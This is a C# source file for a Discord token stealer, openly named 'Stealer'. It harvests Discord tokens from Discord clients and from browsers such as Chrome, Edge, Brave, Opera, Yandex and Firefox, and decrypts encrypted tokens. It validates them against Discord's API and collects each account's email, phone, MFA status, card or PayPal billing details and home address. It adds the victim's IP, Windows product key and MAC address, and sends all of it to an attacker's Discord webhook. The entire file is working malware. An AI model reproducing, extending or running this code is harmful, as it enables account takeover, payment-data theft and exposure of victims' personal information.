using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace StealerExt
{   
    internal class Stealer
	{
		public void StartSteal()
		{
			try
			{
				StealTokenFromChrome();
				StealTokenFromOpera();
				StealTokenFromOperaGX();
				StealTokenFromEdge();
				StealTokenFromBrave();
				StealTokenFromBraveNightly();
				StealTokenFromYandex();
				StealTokenFromDiscordApp();
				StealTokenFromDiscordPtbApp();
				StealTokenFromDiscordCanaryApp();
				StealTokenFromVivaldi();
				StealTokenFromFirefox();
				StealTokenFromDiscordDev();
				if (SavedTokens.Count <= 0)
					SendFailure();
			}
			catch (Exception x)
			{
				new API(API.wHook)
				{
					_name = API.name,
					_ppUrl = API.pfp
				}.SendSysInfo("Exception: " + x.Message, null);
			}
		}
		private void TokenStealer(DirectoryInfo Folder, string Platform)
		{
			foreach (FileInfo file in Folder.GetFilesNew("*.ldb", "*.log", "*.sqlite"))
			{
				string input = file.OpenText().ReadToEnd();
				foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
				{
                    if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
                    {
                        string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
						Task.FromResult(SaveTokensAsync(TokenCheckAccess(token), Platform));
					}
					else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value), Platform));
				}
			}
		}
		private string TokenCheckAccess(string token)
		{
			var http = new HttpUtils();
            Dictionary<string, string> headers = new Dictionary<string, string>
            {
                { "Authorization", token },
                { "Content-Type", "application/json" }
            };
            string response = http.GetStringAsync("https://discordapp.com/api/v9/users/@me/guilds", headers).Result;
            if (response.Contains("401: Unauthorized") || response.Contains("You need to verify your account in order to perform this action."))
            {
                token = "";
            }
            return token;
		}

		private async Task SaveTokensAsync(string token, string Platform)
		{
			if (string.IsNullOrEmpty(token)) return;
			if (SavedTokens.Count > 0)
			{
				Dictionary<string, string> headers = new Dictionary<string, string>
				{
					{ "Authorization", token }
				};
				var request = new HttpUtils();
				string _gettokenInfo = await request.GetStringAsync("https://discordapp.com/api/v8/users/@me", headers);
				dynamic _tokenInfo = JsonConvert.DeserializeObject(_gettokenInfo);
				switch ((int)_tokenInfo.premium_type)
				{
					case 1:
						_tokenInfo.premium_type = "Nitro Classic [$4.99/$49.99]";
						break;
					case 2:
						_tokenInfo.premium_type = "Nitro [$9.99/$99]";
						break;
					default:
						_tokenInfo.premium_type = "None";
						break;
				}
				if (string.IsNullOrEmpty((string)_tokenInfo.phone))
				{
					_tokenInfo.phone = "None";
				}
				string _getpaymentInfo; dynamic payment = string.Empty;
				_getpaymentInfo = await request.GetStringAsync("https://discord.com/api/v9/users/@me/billing/payment-sources", headers);
				_getpaymentInfo = _getpaymentInfo.Replace("[", "");
				_getpaymentInfo = _getpaymentInfo.Replace("]", "");
				bool FailedPaymentInfo = false;
				try
				{
					payment = JsonConvert.DeserializeObject(_getpaymentInfo);
				}
				catch
				{
					FailedPaymentInfo = true;
				}
				ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
				string OSName = null;
				foreach (ManagementObject managementObject in mos.Get())
				{
					OSName = managementObject["Caption"].ToString();
				}
				string IP = new WebClient().DownloadString("https://ipecho.net/plain");
				try
				{
					var embed = new DiscordWebhook(Hook);
					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
					embed.AddField("IP:", IP, true);
					embed.AddField("Windows Version:", OSName, true);
					embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
					embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
					if (_getpaymentInfo.Contains("email") && !FailedPaymentInfo)
					{
						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
					}
					else if ((_getpaymentInfo.Contains("mastercard")) || (_getpaymentInfo.Contains("visa")))
					{
						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
					}
					else if (FailedPaymentInfo)
					{
						embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
					}
					else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
				}
				catch
				{
					var embed = new DiscordWebhook(Hook);
					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
					embed.AddField("IP:", IP, true);
					embed.AddField("Windows Version:", OSName, true);
					embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
					embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
					embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
					await embed.SendEmbed();
				}
				SavedTokens.Add(token);
			}
			else if (!SavedTokens.Contains(token))
			{
                Dictionary<string, string> headers = new Dictionary<string, string>
                {
                    { "Authorization", token }
                };
                var request = new HttpUtils();
				bool PaymentInfo = false;
				string _gettokenInfo = await request.GetStringAsync("https://discordapp.com/api/v8/users/@me", headers);
				dynamic _tokenInfo = JsonConvert.DeserializeObject(_gettokenInfo);
				switch ((int)_tokenInfo.premium_type)
				{
					case 1:
						_tokenInfo.premium_type = "Nitro Classic [$4.99/$49.99]";
						break;
					case 2:
						_tokenInfo.premium_type = "Nitro [$9.99/$99]";
						break;
					default:
						_tokenInfo.premium_type = "None";
						break;
				}
				if (string.IsNullOrEmpty((string)_tokenInfo.phone))
				{
					_tokenInfo.phone = "None";
				}
				dynamic payment = null;
				string _getpaymentInfo;
				try
				{
					_getpaymentInfo = await request.GetStringAsync("https://discord.com/api/v9/users/@me/billing/payment-sources", headers);
					_getpaymentInfo = _getpaymentInfo.Replace("[", "");
					_getpaymentInfo = _getpaymentInfo.Replace("]", "");
					payment = JsonConvert.DeserializeObject(_getpaymentInfo);
				}
				catch
				{
					_getpaymentInfo = null;
					PaymentInfo = true;
				}
				try
				{
					var embed = new DiscordWebhook(Hook);
					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
					if (_getpaymentInfo.Contains("email") && !PaymentInfo)
					{
						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
					}
					else if ((_getpaymentInfo.Contains("mastercard")) || (_getpaymentInfo.Contains("visa")))
					{
						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
					}
					else if (PaymentInfo)
					{
						embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
						PaymentInfo = false;
					}
					else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
					await embed.SendEmbed();
				}
				catch
				{
					try
					{
						var embed = new DiscordWebhook(Hook);
						embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
						embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
						embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
						await embed.SendEmbed();
					}
					catch (Exception x)
					{
						new API(API.wHook)
						{
							_name = API.name,
							_ppUrl = API.pfp
						}.idk($"```{Platform} Token {token}\n```");
						new API(API.wHook)
						{
							_name = API.name,
							_ppUrl = API.pfp
						}.idk($"```{x.Message}```");
					}
				}
				SavedTokens.Add(token);
			}
		}
		private void SendFailure()
		{
			ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
			string OSName = null;
			foreach (ManagementObject managementObject in mos.Get())
			{
				OSName = managementObject["Caption"].ToString();
			}
			string IP = new WebClient().DownloadString("https://ipecho.net/plain");
			var embed = new DiscordWebhook(Hook);
			embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
			embed.AddField("IP:", IP, true);
			embed.AddField("Windows Version:", OSName, true);
			embed.AddField("Product Key", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
			embed.AddField("Token?", "No token was found due to recent password change or Discord not being found in any of the supported platforms!");
			embed.SendEmbed().RunSynchronously();
		}

		private void StealTokenFromDiscordApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord App");
			}
		}
		private void StealTokenFromDiscordDev()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discorddevelopment\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord Developer");
			}
		}
		private void StealTokenFromDiscordCanaryApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord Canary");
			}
		}
		private void StealTokenFromDiscordPtbApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Discord PTB");
			}
		}
		private void StealTokenFromChrome()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo dir in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
            {
				TokenStealer(dir, "Chrome");
			}
		}
		private void StealTokenFromBrave()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Brave");
			}
		}
		private void StealTokenFromBraveNightly()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Brave Nightly");
			}
		}
		private void StealTokenFromOpera()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TokenStealer(folder, "Opera");
			}
		}
		private void StealTokenFromVivaldi()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Vivaldi\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Vivaldi");
			}
		}
		private void StealTokenFromOperaGX()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
            if (folder.Exists)
			{
				TokenStealer(folder, "OperaGX");
			}
		}
        private void StealTokenFromEdge()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Edge");
			}
		}
		private void StealTokenFromYandex()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\";
			if (!Directory.Exists(path)) return;
			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
			{
				TokenStealer(folder, "Yandex");
			}
		}
		private void StealTokenFromFirefox()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\"; 
			if (Directory.Exists(path))
			{
				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
				{
					TokenStealer(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), "Firefox");
				}
			}
		}
        
		private static readonly List<string> SavedTokens = new List<string>();
		public static string Hook = API.wHook;
	}
}
